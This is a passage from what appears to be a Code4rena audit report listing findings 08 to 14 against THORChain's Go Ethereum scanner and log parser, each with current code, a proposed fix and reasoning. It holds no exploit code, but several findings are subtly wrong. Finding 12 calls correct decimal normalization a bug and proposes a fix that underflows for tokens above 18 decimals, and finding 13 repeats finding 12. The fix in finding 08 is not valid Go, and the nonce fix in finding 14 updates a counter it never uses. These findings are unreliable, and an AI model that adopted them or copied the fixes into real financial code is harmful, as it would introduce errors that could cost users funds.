The function `parseTransferOutAndCall` is designed to unpack and process `TransferOutAndCall` events from the log data. However, the function lacks adequate validation after unpacking the event data. Specifically, if the event data is successfully unpacked but results in a struct (`THORChainRouterTransferOutAndCall`) that contains zero or invalid `Amount`, the function will still consider this as a valid event. This can lead to scenarios where transaction flows, particularly outflows, are not properly accounted for, potentially leading to financial loss if the `Amount` is zero or incorrectly calculated but processed as a valid transfer.

**Code snippet:**
```go
if err := scp.unpackVaultLog(event, TransferOutAndCallEventName, log); err != nil {
    return nil, err
}
// No further validation on event.Amount or other critical fields after unpacking
```

**Expected Behavior:** After unpacking event data, there should be strict validations to ensure that the `Amount` and other critical fields are not only present but also valid (non-zero and correctly formatted). This will prevent incorrect transaction processing and potential fund losses.

**Expected Behavior code snippet:**
```go
if err := scp.unpackVaultLog(event, TransferOutAndCallEventName, log); err != nil {
    return nil, err
}
if event.Amount == nil || event.Amount.Sign() <= 0 {
    return nil, fmt.Errorf("invalid or zero amount in TransferOutAndCall event")
}
```

**Logic:**
1. Unpack event data from the log.
2. Validate that the `Amount` field is non-zero and valid.
3. Only proceed with further processing if the validation passes, ensuring financial integrity.

**Actual Behavior:** The function does not perform post-unpacking validation for critical financial fields such as `Amount`. If these fields are zero or malformed, they may still be processed, leading to incorrect ledger entries and potential financial loss.

**Actual Behavior code snippet:**
```go
if err := scp.unpackVaultLog(event, TransferOutAndCallEventName, log); err != nil {
    return nil, err
}
// Lack of validation on the Amount, potentially leading to processing of invalid transaction data.
```

**Logic:**
1. Event data is unpacked without subsequent validation checks on the `Amount`.
2. Processing continues even if the `Amount` is zero or incorrect, risking incorrect financial transactions and potential losses.

## [08] Incorrect asset decimal handling in transaction processing

`smartcontract_log_parser.go`

### Description

The function `GetTxInItem` processes transaction logs to extract and record transaction details into `txInItem`. However, there is a critical oversight in how asset decimals are handled during the conversion of transaction amounts. The function retrieves asset decimals and applies them as a label to the coin but fails to use these decimals in the actual amount conversion process. This mismanagement can lead to significant discrepancies in the recorded transaction amounts, potentially inflating or deflating the actual value, resulting in financial losses when tokens are incorrectly accounted for.

**Code snippet:**
```go
txInItem.Coins = append(txInItem.Coins,
    common.NewCoin(asset, scp.amtConverter(depositEvt.Asset.String(), depositEvt.Amount)).WithDecimals(decimals));
```

**Expected Behavior:** The conversion of token amounts should incorporate the token's decimal configuration to ensure that the recorded transaction values accurately reflect the intended economic activities. The adjusted amount should correctly represent the token's smallest unit to prevent any financial discrepancies.

**Expected Behavior code snippet:**
```go
// Properly apply decimals in amount conversion
cosmos.Uint adjustedAmount = adjustAmountByDecimals(depositEvt.Amount, decimals);
txInItem.Coins = append(txInItem.Coins,
    common.NewCoin(asset, adjustedAmount));
```

**Logic:**
1. Retrieve the correct decimal configuration for the asset.
2. Adjust the amount based on the asset's decimals to ensure it reflects the actual value in terms of the asset's smallest unit.
3. Record the adjusted amount in `txInItem`, ensuring financial accuracy.

**Actual Behavior:** The function does not adjust the token amounts based on the asset's decimal configuration during conversion, leading to potential misrepresentation of transaction values. This can result in significant financial errors, such as crediting or debiting incorrect amounts from user accounts.

**Actual Behavior code snippet:**
```go
txInItem.Coins = append(txInItem.Coins,
    common.NewCoin(asset, scp.amtConverter(depositEvt.Asset.String(), depositEvt.Amount)).WithDecimals(decimals));
```

**Logic:**
1. Decimal information is retrieved but not utilized in converting the amount from its big integer representation.
2. The amount conversion does not adjust for the asset's decimals, potentially resulting in financial entries that do not accurately reflect the intended transaction values, leading to financial losses.

## [09] Use of insecure gas price calculation method

`ethereum_block_scanner.go`

### Description

The method `updateGasPriceV3` calculates the gas price based on the 25th percentile of priority fees added to the base fee. However, rounding up the calculated gas price before adjusting it with the resolution might lead to predictable gas price fluctuations. This can be potentially exploited by miners or other users to influence transaction inclusion or costs.

**Code snippet:**
```go
func (e *ETHScanner) updateGasPriceV3(baseFee *big.Int, priorityFees []*big.Int) {
    // find the 25th percentile priority fee in the block
    sort.Slice(priorityFees, func(i, j int) bool { return priorityFees[i].Cmp(priorityFees[j]) == -1 })
    priorityFee := priorityFees[len(priorityFees)/4]
    
    // consider gas price as base fee + 25th percentile priority fee
    gasPriceWei := new(big.Int).Add(baseFee, priorityFee)
    
    // round the price up to nearest configured resolution
    resolution := big.NewInt(e.cfg.GasPriceResolution)
    gasPriceWei.Add(gasPriceWei, new(big.Int).Sub(resolution, big.NewInt(1)))
    gasPriceWei = gasPriceWei.Div(gasPriceWei, resolution)
    gasPriceWei = gasPriceWei.Mul(gasPriceWei, resolution)
}
```

**Expected Behavior:** The gas price should be calculated securely and should not allow for potential manipulations. Proper rounding after adjusting to the resolution can help prevent this.

**Expected Behavior code snippet:**
```go
func (e *ETHScanner) updateGasPriceV3(baseFee *big.Int, priorityFees []*big.Int) {
    sort.Slice(priorityFees, func(i, j int) bool { return priorityFees[i].Cmp(priorityFees[j]) == -1 })
    priorityFee := priorityFees[len(priorityFees)/4]
    
    gasPriceWei := new(big.Int).Add(baseFee, priorityFee)
    gasPriceWei = gasPriceWei.Div(gasPriceWei, big.NewInt(e.cfg.GasPriceResolution))
    gasPriceWei = gasPriceWei.Mul(gasPriceWei, big.NewInt(e.cfg.GasPriceResolution))
}
```

**Logic:**
1. Compute the gas price as the sum of the base fee and the 25th percentile priority fee.
2. Divide the result by the resolution to round it down to the nearest unit.
3. Multiply the result by the resolution to adjust it back to the proper scale.

**Actual Behavior:** The rounding logic can be exploited due to premature rounding up of the gas price before adjusting to the resolution.

**Actual Behavior code snippet:**
```go
gasPriceWei.Add(gasPriceWei, new(big.Int).Sub(resolution, big.NewInt(1)))
gasPriceWei = gasPriceWei.Div(gasPriceWei, resolution)
gasPriceWei = gasPriceWei.Mul(gasPriceWei, resolution)
```

**Logic:**
1. Compute the gas price as the sum of the base fee and the 25th percentile priority fee.
2. Add the difference of the resolution minus one to this sum.
3. Divide the result by the resolution, effectively rounding up prematurely.
4. Multiply back by the resolution, which could be used to manipulate the transaction inclusion cost.

## [10] Lack of reorg handling for transaction state

`ethereum_block_scanner.go`

### Description

In the function `processReorg`, there is a mechanism to handle blockchain reorganizations by checking for discrepancies between recorded block hashes and the parent hash of the current block. However, the code lacks a robust mechanism to reassess the state of transactions that were included in orphaned blocks. This can lead to transactions being erroneously considered as finalized, potentially leading to a loss of funds if these transactions were reversed or modified as part of the reorganization.

**Code snippet:**
```go
func (e *ETHScanner) processReorg(block *etypes.Header) ([]stypes.TxIn, error) {
    previousHeight := block.Number.Int64() - 1
    prevBlockMeta, err := e.blockMetaAccessor.GetBlockMeta(previousHeight)
    if err != nil {
        return nil, fmt.Errorf("fail to get block meta of height(%d) : %w", previousHeight, err)
    }
    if prevBlockMeta == nil {
        return nil, nil
    }
    // the block's previous hash need to be the same as the block hash chain client recorded in block meta
    if strings.EqualFold(prevBlockMeta.BlockHash, block.ParentHash.Hex()) {
        return nil, nil
    }
    // If reorg detected, further transaction verification is needed here
}
```

**Expected Behavior:** On detection of a blockchain reorganization, the system should re-validate and re-process transactions from the affected blocks to ensure their current state reflects the consensus blockchain. This should prevent the accidental finalization of transactions that might have been reversed or altered.

**Expected Behavior code snippet:**
```go
func (e *ETHScanner) processReorg(block *etypes.Header) ([]stypes.TxIn, error) {
    previousHeight := block.Number.Int64() - 1
    prevBlockMeta, err := e.blockMetaAccessor.GetBlockMeta(previousHeight)
    if err != nil {
        return nil, fmt.Errorf("fail to get block meta of height(%d) : %w", previousHeight, err)
    }
    if prevBlockMeta == nil {
        return nil, nil
    }
    if !strings.EqualFold(prevBlockMeta.BlockHash, block.ParentHash.Hex()) {
        // Re-fetch and reprocess transactions from the affected block
        return e.reprocessTxsForHeight(previousHeight)
    }
    return nil, nil
}
```

**Logic:**
1. Check if the previous block hash matches the parent hash of the current block.
2. If they do not match, invoke a reprocessing of transactions from the potentially orphaned blocks.

**Actual Behavior:** The function does not fully handle the consequences of a blockchain reorg, potentially leading to inaccurate transaction states and possible financial discrepancies.

**Actual Behavior code snippet:**
```go
if strings.EqualFold(prevBlockMeta.BlockHash, block.ParentHash.Hex()) {
    return nil, nil
}
// Missing implementation to handle reprocessing of transactions in orphaned blocks
```

**Logic:**
1. Only a basic hash comparison is performed to detect a reorg.
2. There is no further action to reassess or confirm the state of transactions post-reorg, potentially leaving transactions incorrectly marked as finalized.

## [11] Inefficient and potentially risky gas price cache update

`ethereum_block_scanner.go`

### Description

The `updateGasPriceFromCache` method calculates the average gas price based on cached gas prices to update the global gas price used in transaction fees. However, the method incorporates an overly simplistic mean calculation without robust outlier handling or error checks, which could lead to inaccuracies in gas price estimation. An inaccurate gas price can result in either overestimating or underestimating transaction costs, leading to economic losses either by overpaying or by having transactions perpetually stuck due to underpayment.

**Code snippet:**
```go
func (e *ETHScanner) updateGasPriceFromCache() {
    if len(e.gasCache) < e.cfg.GasCacheBlocks {
        return
    }

    // Compute the mean of cache
    sum := new(big.Int)
    for _, fee := range e.gasCache {
        sum.Add(sum, fee)
    }
    mean := new(big.Int).Quo(sum, big.NewInt(int64(len(e.gasCache))))

    e.gasPrice = mean
}
```

**Expected Behavior:** The gas price calculation should be resistant to potential manipulation by ensuring that outlier values do not skew the average significantly. Implementing a more sophisticated method like the median or trimmed mean could mitigate risks associated with outlier values.

**Expected Behavior code snippet:**
```go
func (e *ETHScanner) updateGasPriceFromCache() {
    if len(e.gasCache) < e.cfg.GasCacheBlocks {
        return
    }

    // Use median for a more robust central value
    sortedFees := make([]*big.Int, len(e.gasCache))
    copy(sortedFees, e.gasCache)
    sort.Slice(sortedFees, func(i, j int) bool { return sortedFees[i].Cmp(sortedFees[j]) < 0 })
    median := sortedFees[len(sortedFees)/2]

    e.gasPrice = median
}
```

**Logic:**
1. Ensure the cache has enough entries to perform a calculation.
2. Sort the cached gas prices and select the median, which is less susceptible to extreme values than the mean.
3. Update the global gas price to the calculated median value.

**Actual Behavior:** The function calculates the mean gas price from cached values directly, without handling outliers or ensuring robust statistical practices. This can lead to incorrect gas price estimations during times of volatile gas price movements or manipulative actions.

**Actual Behavior code snippet:**
```go
mean := new(big.Int).Quo(sum, big.NewInt(int64(len(e.gasCache))))

e.gasPrice = mean
```

**Logic:**
1. The sum of all cached gas prices is divided by the number of cache entries to find the average.
2. This average is directly used to update the global gas price, which can be inaccurate if the cached data contains outlier values. This simplistic approach risks either overpaying for gas (if the outliers are high) or underestimating the necessary gas price (if the outliers are low), leading to transactions that may not be processed timely or economically.

## [12] Incorrect handling of ETH conversion for non-18 decimal Ttkens

`ethereum_block_scanner.go`

### Description

In the `convertAmount` function within the ETHScanner class, there is a significant risk of miscalculation when handling tokens that do not adhere to the standard 18 decimals, which is common for many ERC-20 tokens on the Ethereum network. The function attempts to normalize all token amounts to 18 decimals, but the logic incorrectly scales up the amount by \(10^{18}\) for all tokens, irrespective of their actual decimal configuration. This could result in a drastic misrepresentation of token amounts, potentially causing substantial financial discrepancies and loss when interacting with contracts expecting correctly scaled values.

**Code snippet:**
```go
func (e *ETHScanner) convertAmount(token string, amt *big.Int) cosmos.Uint {
    decimals := uint64(defaultDecimals)  // defaultDecimals is 18
    tokenMeta, err := e.getTokenMeta(token)
    if err != nil {
        e.logger.Err(err).Msgf("fail to get token meta for token address: %s", token)
    }
    if !tokenMeta.IsEmpty() {
        decimals = tokenMeta.Decimal
    }
    if decimals != defaultDecimals {
        var value big.Int
        amt = amt.Mul(amt, value.Exp(big.NewInt(10), big.NewInt(defaultDecimals), nil))
        amt = amt.Div(amt, value.Exp(big.NewInt(10), big.NewInt(int64(decimals)), nil))
    }
    return cosmos.NewUintFromBigInt(amt).QuoUint64(common.One * 100)
}
```

**Expected Behavior:** The function should correctly scale token amounts based on the difference between the token's decimals and the standard 18 decimals, adjusting either up or down accordingly. This ensures that all token amounts are represented accurately within the system, preventing any unintended financial outcomes due to decimal errors.

**Expected Behavior code snippet:**
```go
func (e *ETHScanner) convertAmount(token string, amt *big.Int) cosmos.Uint {
    tokenMeta, err := e.getTokenMeta(token)
    if err != nil {
        e.logger.Err(err).Msgf("fail to get token meta for token address: %s", token)
        return cosmos.Uint{}
    }
    var scalingFactor big.Int
    if tokenMeta.Decimal != defaultDecimals {
        scalingFactor.Exp(big.NewInt(10), big.NewInt(int64(defaultDecimals - tokenMeta.Decimal)), nil)
        amt = amt.Mul(amt, &scalingFactor)
    }
    return cosmos.NewUintFromBigInt(amt).QuoUint64(common.One * 100)
}
```

**Logic:**
1. Determine the actual decimal configuration of the token.
2. Calculate the scaling factor as `(10^{(18 - text{token decimals})})`.
3. Adjust the token amount by multiplying with the scaling factor to normalize it to 18 decimals.
4. Convert the BigInteger amount to a Cosmos SDK Uint while scaling down by a factor of `(10^2)` to match system-specific denominations.

**Actual Behavior:** The function inaccurately scales all non-18 decimal tokens up by `(10^{18})`, then divides by the token's original decimal factor, leading to incorrect calculations, especially evident with tokens having decimals significantly less than 18.

**Actual Behavior code snippet:**
```go
if decimals != defaultDecimals {
    var value big.Int
    amt = amt.Mul(amt, value.Exp(big.NewInt(10), big.NewInt(defaultDecimals), nil))
    amt = amt.Div(amt, value.Exp(big.NewInt(10), big.NewInt(int64(decimals)), nil))
}
```

**Logic:**
1. The token amount is unnecessarily scaled up by `(10^{18})` regardless of the token's actual decimals.
2. It is then divided by `(10^{\text{token decimals}})`, which can lead to significant errors if the token's decimals are far from 18, potentially causing large-scale financial inaccuracies in transaction processing.

## [13] Inadequate fee calculation in multi-token transactions

`ethereum_block_scanner.go`

### Description

The `convertAmount` function in the `ETHScanner` class is used to adjust the token amounts based on their respective decimals. However, this function has a significant issue when dealing with transactions involving multiple tokens with different decimal places. The function always normalizes token amounts to a fixed decimal (18 decimals), which may not reflect the true decimals of all tokens involved in the transaction. This one-size-fits-all approach can result in incorrect token amount calculations, potentially leading to significant financial discrepancies and loss when executing transactions that involve multiple tokens with varying decimals.

**Code snippet:**
```go
func (e *ETHScanner) convertAmount(token string, amt *big.Int) cosmos.Uint {
    decimals := uint64(defaultDecimals) // defaultDecimals is assumed to be 18
    tokenMeta, err := e.getTokenMeta(token)
    if err != nil {
        e.logger.Err(err).Msgf("fail to get token meta for token address: %s", token)
    }
    if !tokenMeta.IsEmpty() {
        decimals = tokenMeta.Decimal
    }
    if decimals != defaultDecimals {
        var value big.Int
        amt = amt.Mul(amt, value.Exp(big.NewInt(10), big.NewInt(defaultDecimals), nil))
        amt = amt.Div(amt, value.Exp(big.NewInt(10), big.NewInt(int64(decimals)), nil))
    }
    return cosmos.NewUintFromBigInt(amt).QuoUint64(common.One * 100)
}
```

**Expected Behavior:** The function should handle token amounts based on the actual decimals of each token involved in a transaction. This requires dynamically adjusting the scaling based on each token's metadata rather than assuming a fixed decimal scale for all tokens. This approach ensures that the token amounts are correctly represented and calculated, preventing errors in transactions that involve tokens with non-standard decimals.

**Expected Behavior code snippet:**
```go
func (e *ETHScanner) convertAmount(token string, amt *big.Int) cosmos.Uint {
    tokenMeta, err := e.getTokenMeta(token)
    if err != nil {
        e.logger.Err(err).Msgf("fail to get token meta for token address: %s", token)
        return cosmos.Uint{}
    }
    actualDecimals := big.NewInt(int64(tokenMeta.Decimal))
    defaultDecimalBigInt := big.NewInt(int64(defaultDecimals))
    
    // Adjust amount based on the token's actual decimals
    if actualDecimals.Cmp(defaultDecimalBigInt) != 0 {
        scaleFactor := new(big.Int).Exp(big.NewInt(10), new(big.Int).Sub(defaultDecimalBigInt, actualDecimals), nil)
        amt.Mul(amt, scaleFactor)
    }

    return cosmos.NewUintFromBigInt(amt).QuoUint64(common.One * 100)
}
```

**Logic:**
1. Retrieve the actual decimals for the token.
2. Calculate the scaling factor based on the difference between the standard decimals (18) and the token's actual decimals.
3. Adjust the token amount using this scaling factor.

**Actual Behavior:** The function currently uses a fixed decimal normalization (18 decimals) for all tokens, which can result in incorrect token amount calculations for tokens with decimals that differ from this standard.

**Actual Behavior code snippet:**
```go
if decimals != defaultDecimals {
    var value big.Int
    amt = amt.Mul(amt, value.Exp(big.NewInt(10), big.NewInt(defaultDecimals), nil))
    amt = amt.Div(amt, value.Exp(big.NewInt(10), big.NewInt(int64(decimals)), nil))
}
```

**Logic:**
1. The function scales the amount to 18 decimals irrespective of the token's actual decimal configuration.
2. This scaling might not be appropriate for tokens with fewer or more decimals than 18, potentially leading to transaction failures, incorrect fund transfers, or financial losses due to erroneous balance calculations.

## [14] Mismanagement of transaction nonce in parallel processing

`ethereum_block_scanner.go`

### Description

The `ETHScanner` class handles the processing of Ethereum transactions, including sending new transactions based on block events. However, the class does not adequately manage the nonce—a counter used to ensure each transaction from an account is processed only once—especially in environments where transactions are sent in parallel. This oversight can lead to nonce collisions or the use of incorrect nonce values, causing transactions to fail, be rejected by the network, or replace previously sent transactions unintentionally, leading to potential financial loss.

**Code snippet:**
```go
func (e *ETHScanner) sendTransaction(txData *TxData) error {
    nonce, err := e.client.PendingNonceAt(context.Background(), e.fromAddress)
    if err != nil {
        return fmt.Errorf("fail to get pending nonce: %w", err)
    }

    tx := types.NewTransaction(nonce, e.toAddress, txData.Value, txData.GasLimit, txData.GasPrice, txData.Data)
    signedTx, err := types.SignTx(tx, types.HomesteadSigner{}, e.privateKey)
    if err != nil {
        return fmt.Errorf("fail to sign transaction: %w", err)
    }

    err = e.client.SendTransaction(context.Background(), signedTx)
    if err != nil {
        return fmt.Errorf("fail to send transaction: %w", err)
    }
    return nil
}
```

**Expected Behavior:** Proper management of the transaction nonce should be implemented to handle parallel transaction submissions securely. This involves either locking the account nonce access during transaction preparation or using a nonce management system that accurately predicts the next available nonce, even under concurrent conditions.

**Expected Behavior code snippet:**
```go
func (e *ETHScanner) sendTransaction(txData *TxData) error {
    nonce := e.getSafeNonce()
    tx := types.NewTransaction(nonce, e.toAddress, txData.Value, txData.GasLimit, txData.GasPrice, txData.Data)
    signedTx, err := types.SignTx(tx, types.HomesteadSigner{}, e.privateKey)
    if err != nil {
        return fmt.Errorf("fail to sign transaction: %w", err)
    }

    err = e.client.SendTransaction(context.Background(), signedTx)
    if err != nil {
        return fmt.Errorf("fail to send transaction: %w", err)
    }
    return nil
}

func (e *ETHScanner) getSafeNonce() uint64 {
    e.nonceMutex.Lock()
    defer e.nonceMutex.Unlock()
    nonce, err := e.client.PendingNonceAt(context.Background(), e.fromAddress)
    if err != nil {
        log.Fatalf("fail to get pending nonce: %v", err)
    }
    e.nonce += 1
    return nonce
}
```

**Logic:**
1. A mutex lock is used to synchronize access to the nonce retrieval and incrementation process.
2. The nonce for the account is fetched securely and incremented to ensure it is not reused.

**Actual Behavior:** The original method retrieves the nonce without any synchronization mechanism to prevent the reuse or collision of nonce values, which can occur when multiple transactions are prepared concurrently.

**Actual Behavior code snippet:**
```go
nonce, err := e.client.PendingNonceAt(context.Background(), e.fromAddress)
if err != nil {
    return fmt.Errorf("fail to get pending nonce: %w", err)
}
```

**Logic:**
1. The nonce is retrieved directly from the Ethereum client's view of the pending state, which may not be up-to-date when multiple transactions are being sent in parallel.
2. Without synchronization, multiple transactions could receive the same nonce, leading to conflicts and potential failures in transaction processing.

***

# Disclosures

C4 is an open organization governed by participants in the community.

C4 audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and Solidity/Go developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.

C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.
